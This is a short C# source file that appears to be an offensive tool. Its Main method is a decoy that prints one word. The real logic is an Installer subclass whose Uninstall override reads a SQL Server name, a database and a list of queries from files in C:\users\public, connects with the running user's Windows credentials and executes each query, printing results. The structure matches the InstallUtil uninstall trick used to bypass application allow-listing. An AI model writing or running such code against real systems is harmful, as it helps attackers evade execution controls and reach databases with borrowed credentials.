using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SqlExecInstall
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("buu");
        }
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        String sqlServer = System.IO.File.ReadAllText(@"C:\users\public\server.txt");
        String database = System.IO.File.ReadAllText(@"C:\users\public\database.txt");
        
        String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

        SqlConnection con = new SqlConnection(conString);

        try
        {
            con.Open();
            Console.WriteLine("Auth success.");
        }
        catch
        {
            Console.WriteLine("Auth failed.");
            Environment.Exit(0);
        }
        
        List<string> queries = new List<string>();
        foreach (string line in System.IO.File.ReadAllLines(@"C:\users\public\sql.txt"))
        {
            queries.Add(line);
        }

        foreach (string query in queries)
        {
            SqlCommand command = new SqlCommand(query, con);
            //Console.WriteLine($"Executing query: \"{query}\"");
            SqlDataReader reader = command.ExecuteReader();
            if (reader.HasRows)
            {
                do
                {
                    Console.WriteLine("Result:");
                    while (reader.Read())
                    {
                        Console.WriteLine($"   {reader[0]}");
                    }
                }
                while (reader.NextResult());
            }
            else
            {
                Console.WriteLine("The request returned no result.");
            }
            reader.Close();
        }

        con.Close();
    }
}